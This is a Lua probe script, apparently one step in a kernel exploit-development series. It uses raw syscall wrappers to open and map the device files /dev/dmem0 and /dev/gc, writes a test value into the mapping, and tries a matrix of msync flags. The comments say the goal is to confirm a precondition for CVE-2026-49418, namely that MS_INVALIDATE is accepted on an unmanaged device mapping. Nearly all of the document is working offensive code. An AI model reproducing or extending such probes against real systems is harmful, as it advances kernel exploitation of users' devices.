-- CRASH_CLASS: LOW
-- PROBE 455c: msync flag matrix on a DEVICE mapping
--
-- 455a proved /dev/dmem0 and /dev/gc mmap MAP_SHARED successfully. 455b's
-- anonymous rows showed flags 0/1/4 accepted and 2/3/6/7 refused, but it died
-- before reaching a device row (its own nil handling, not the kernel).
-- CVE-2026-49418 needs msync(MS_INVALIDATE) to be ACCEPTED on an unmanaged
-- device object, so this asks exactly that question and nothing else.

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function split(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    local n = tonumber(v) or 0
    if n < 0 then n = n + 4294967296 end
    return math.floor(n / 4294967296), n % 4294967296
end
local function isneg(h, l) return h == 0xFFFFFFFF and l == 0xFFFFFFFF end
local function hex(h, l) return string.format("0x%X%08X", h, l) end
local function put_name(s)
    local b = memory.alloc(#s + 1)
    local i = 0
    while i < #s do memory.write_byte(b + i, string.byte(s, i + 1)); i = i + 1 end
    memory.write_byte(b + #s, 0)
    return b
end

local sc_open, sc_close = make_syscall(5), make_syscall(6)
local sc_mmap, sc_munmap = make_syscall(477), make_syscall(73)
local sc_msync = make_syscall(65)
local ZERO = uint64(0)
local MINUS1 = uint64("0xFFFFFFFFFFFFFFFF")

print("=== PROBE 455c: MSYNC FLAGS ON A DEVICE MAPPING ===")
print("")

local function mmap(size, prot, flags, fd, off)
    local ok, rv = pcall(function()
        return sc_mmap(ZERO, uint64(size), uint64(prot), uint64(flags), fd, uint64(off))
    end)
    if not ok then return nil, nil, "THREW" end
    local h, l = split(rv)
    if isneg(h, l) or (h == 0 and l == 0) then return nil, nil, hex(h, l) end
    return h, l, nil
end

local combos = {
    { 0, "0 none" }, { 1, "1 ASYNC" }, { 2, "2 INVALIDATE" },
    { 3, "3 ASYNC|INV" }, { 4, "4 SYNC" }, { 6, "6 SYNC|INV" },
    { 7, "7 all" }, { 8, "8 bit3" },
}

local function rows(tag, h, l, size)
    local au = uint64(string.format("0x%X%08X", h, l))
    for _, c in ipairs(combos) do
        local ok, rv = pcall(function() return sc_msync(au, uint64(size), uint64(c[1])) end)
        local rh, rl = 0, 0
        if ok then rh, rl = split(rv) end
        print(string.format("    %-12s %-14s rv=%s", tag, c[2], ok and hex(rh, rl) or "THREW"))
    end
end

for _, path in ipairs({ "/dev/dmem0", "/dev/gc" }) do
    print(string.format("[A] %s", path))
    local okf, fdv = pcall(function() return sc_open(put_name(path), uint64(2), uint64(0)) end)
    local fh, fl = 0, 0
    if okf then fh, fl = split(fdv) end
    if isneg(fh, fl) or fl == 0 then
        print(string.format("    open rv=%s", hex(fh, fl)))
    else
        print(string.format("    open fd=%d", fl))
        local h, l, why = mmap(0x4000, 3, 1, uint64(fl), 0)
        if not h then
            print(string.format("    mmap(SHARED) refused %s", tostring(why)))
        else
            print(string.format("    mapped=%s", hex(h, l)))
            local wok = pcall(function() memory.write_dword(uint64(string.format("0x%X%08X", h, l)), 0x11223344) end)
            print(string.format("    write=%s", tostring(wok)))
            rows(path, h, l, 0x4000)
            local mh, ml = 0, 0
            local mok, mrv = pcall(function() return sc_munmap(uint64(string.format("0x%X%08X", h, l)), uint64(0x4000)) end)
            if mok then mh, ml = split(mrv) end
            print(string.format("    munmap rv=%s", hex(mh, ml)))
        end
        pcall(function() return sc_close(uint64(fl)) end)
    end
end

print("")
print("=== 455c DONE ===")
